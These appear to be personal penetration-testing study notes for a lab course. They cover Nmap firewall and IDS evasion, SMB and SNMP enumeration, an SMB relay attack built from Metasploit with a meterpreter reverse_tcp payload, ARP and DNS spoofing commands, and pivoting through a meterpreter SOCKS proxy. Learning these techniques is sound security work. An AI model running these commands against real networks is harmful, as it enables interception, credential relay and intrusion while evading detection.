# Host & Network Pentesting: Network-Based Attacks

## Networking Fundamentals

- Every packet has Header and Payload: Header is where it contain where is it from and where it is to, what protocol is it (tell the computer how to process it), payload is the stuff inside including higher OSI layers Header

## Firewall Detection & IDS Evasion

### how to use Nmap to bypass Firewall and IDS

- First, how to detect if there is a firewall (Open nmap -h manual and look at Firewall/IDS Evasion and spoofing session): Use sA scan, ACK scan will send an ACK packet, and it will tell us if it is open/unfiltered or filtered, if it is filtered, it is most likely there is a stateful firewall.

Fragmentation
- To Evade IDS and Firewall, a good skill is to fragment the packet
- `-f` flag to change the MTU, `--mtu` (Maximum traffic unit) to specific the mtu size, `nmap -Pn -sS -sV -F -f <IP>` vs `nmap -Pn -sS -sV -F <IP>` vs `nmap -Pn -sS -sV -F -f --mtu 8 <IP>`

Spoofing & Decoy (what hackersploit usually do)
- `-ttl and --data-lenth and -D (decoy ID)` is very useful to add variety
- `nmap -Pn -sS -sV -p445,3389 -f --data-length 200 -D <Decoy IP, usually we warm to set it from the gateway and broadcast since thats the least sus>`
- can change source port using the `-g` options like `-g 53`

Why disable DNS resolution using the `-n` option

1. ⚡ Speed:DNS lookups can significantly slow down scans — especially when scanning large IP ranges. Each IP might require a reverse DNS lookup, which introduces latency if DNS servers are slow or unresponsive.
2. 📉 Avoiding Noise & Detection: DNS queries can trigger security alerts or get logged, which might alert admins to your presence. Disabling resolution makes the scan more stealthy.
3. 📵 Unavailable DNS: On internal networks or CTFs, reverse DNS might not even be configured. Waiting for responses that never come wastes time.
4. 🎯 Accuracy & Clarity: Disabling DNS ensures Nmap just shows raw IP addresses instead of potentially misleading or incorrect hostnames.

## Network Enumeration

- Goal: service enumeration to gather additional, more specific/detailed info about hosts on a network and services running
- This phrase is to interact with the different protocols and ports open on the hosts, with the intent of eventually exploiting them

### SMB & NetBios Enum (Need further studies)
- They are 2 different technologies, but they're related in the context of networking and file sharing on windows networks.
- NetBios is an API and a set of network protocols for providing communication services over a local network, primarily to allow app on different computers to find and interact with each other on a network.
- 3 Primary Services of NetBIOS: 1) Name Service: Allow computers to register, unregister and resolve names in the network 2) Datagram Service: Supports connectionless communication and broadcasting 3) Session Service: Supports connection-oriented communication for more reliable data transfers.
- NetBIOS typically uses ports 137(Name), 138(Datagram), 139(Session) over UDP and TCP
- SMBv1 might also be vulnerable to null session (anonymous login)

Tools to use for netbios: nbtscan, nmblookup, nmap script=nbstat

Tools to use for smb: nmap script=smb-protocols, script=smb-security-mode, smb-enum-users

- After enumerating the user, we can use hydra to bf the smb login
- Then we can use psexec.py to login




### SNMP

- Used to monitor and manage networked devices such as routers, switches, printers, servers etc
- Allow network admin to query devices for status info, configure certain settings
- SNMP uses UDP, is an application layer protocol and involves 3 primary components:
  1) SNMP Manager: Responsible for querying and interacting with SNMP agents on networked devices
  2) SNMP Agent: Software running on the devices that responds to queries and sends traps
  3) Management Info Base(MIB): A gierarchical database that defines the structure fo data available through SNMP. Each piece of data has a unique Object Identifier(OID)
- Versions of SNMP:
  1) SNMPv1: Using community strings (essentially passwords) for authentication
  2) SNMPv2c: An improved version with support for bulk transfers but still relying on community strings for authentication
  3) SNMPv3: Introduced security features, including encryption, message integrity, and user-based authentication.
- Port used 161 (SNMP queries), 162 (SNMP traps-notifications)
- Enumerating SNMP is to querying the SNMP enableed devices, including misconfig, and potential vuln

Steps for SNMP Enum
1. Identify SNMP Enabled Devices: determine if the device got SNMP, whether they are vuln to info leakage or attacks
2. Extract System Information: Collect sys-related data such as device names, OS, software versions, network interfaces etc
3. Identify Community Strings: To gain legitamate accesss
   

### SMB Relay Attack

Theory: This attack involves three machines:
- a client machine (wishing to connect and authenticate with target machine using smb)
- attacker machine aka us
- the target machine (server with smb service)

**how it works**
1. Set up a rogued smb server with metasploit exploit/windows/smb/smb_relay module
   
```bash
  msfconsole
  use exploit/windows/smb/smb_relay
  set SRVHOST 172.16.5.101  //SRVHOST is the IP address of the attacker's fake SMB server
  set PAYLOAD windows/meterpreter/reverse_tcp //Payload to deliver upon successful relay
  set LHOST 172.16.5.101
  set SMBHOST 172.16.5.10 //The real SMB server (target machine)
  run
```

2. Set up ARP spoofing to redirect DNS traffic to us (for dns poisoning to work, it base on MAC address in the network. ARP spoofing poisons the ARP tables of both the client and the real DNS server so that they believe the attacker is the other party. This works because ARP is trust-based — machines update their ARP cache from unsolicited replies.)

```bash
  On separate terminal, run the following commands:
  arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
  arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
```

3. Set up fake DNS resolve file

  `echo "172.16.5.101 *.sportsfoo.com" > dns`
  
5. Set up eth1 (same one as the one in arpspoof) as fake dns server's interface

  `dnsspoof -i eth1 -f dns`
  
6. Allow attacker machine to receive and forward network traffic instead of just receiving, by toggling the ip_forward file

  `echo 1 > /proc/sys/net/ipv4/ip_forward`

```
+----------------+          ARP Spoofed Traffic          +----------------+
|                |  <--------------------------------->  |                |
|   Client       |             (You = MITM)              |   SMB Server   |
| 172.16.5.5     |                                       | 172.16.5.10    |
+-------+--------+                                       +--------+-------+
        |                                                       ^
        |                                                       |
        v                                                       |
+----------------+   DNS Spoofing (sportsfoo.com → you)         |
|                |----------------------------------------------+
|   Attacker     |
| 172.16.5.101   |
| (MITM)         |
| - ARP spoofing |
| - DNS spoofing |
| - IP forwarding|
| - SMB relay    |
+----------------+
```

**How it will end up in when someone tries to connect to smb server:**
1. Client tries to resolve share.sportsfoo.com (DNS)
2. DNS request is intercepted by Attacker (due to ARP spoofing)
3. Attacker responds with their own IP (fake DNS response)
4. Client tries to connect to 172.16.5.101 (Attacker) over SMB
5. Attacker relays this SMB authentication to real SMB server
6. If successful, attacker gains session or replays credentials

### Pivoting

```
┌──────────────────────────────┐
│ Attacker (Your Kali Machine)│
│ ─────────────────────────── │
│ - proxychains               │
│ - nmap demo1.ine.local      │
│ - proxy config:             │
│   socks4 127.0.0.1 9050     │
└────────────┬────────────────┘
             │ SOCKS4
             ▼
┌──────────────────────────────┐
│ Metasploit SOCKS Proxy (9050)│
│ (auxiliary/server/socks_proxy) 
└────────────┬────────────────┘
             │
             ▼
┌──────────────────────────────┐
│ Meterpreter session          │
│ (Reverse shell via port 4444)│
└────────────┬────────────────┘
             │
             ▼
┌──────────────────────────────┐
│ Compromised Host (Victim #1) │
│ Has internal access to:      │
│ - demo1.ine.local            │
└────────────┬────────────────┘
             │
             ▼
┌──────────────────────────────┐
│ Internal Target (Victim #2)  │
│ demo1.ine.local:445          │
└──────────────────────────────┘
```

| Step | What Happens                                                                         |
| ---- | ------------------------------------------------------------------------------------ |
| 1    | You run `proxychains nmap demo1.ine.local -sT -Pn -sV -p 445`                        |
| 2    | `proxychains` intercepts the connection to `demo1.ine.local:445`                     |
| 3    | It sends the connection request to `127.0.0.1:9050` (SOCKS4)                         |
| 4    | `socks_proxy` (in Metasploit) accepts the request                                    |
| 5    | It uses the **meterpreter session** to tunnel the request to the **internal target** |
| 6    | The request reaches `demo1.ine.local:445` as if it's coming from Victim1             |
| 7    | The response travels back through the same route in reverse                          |





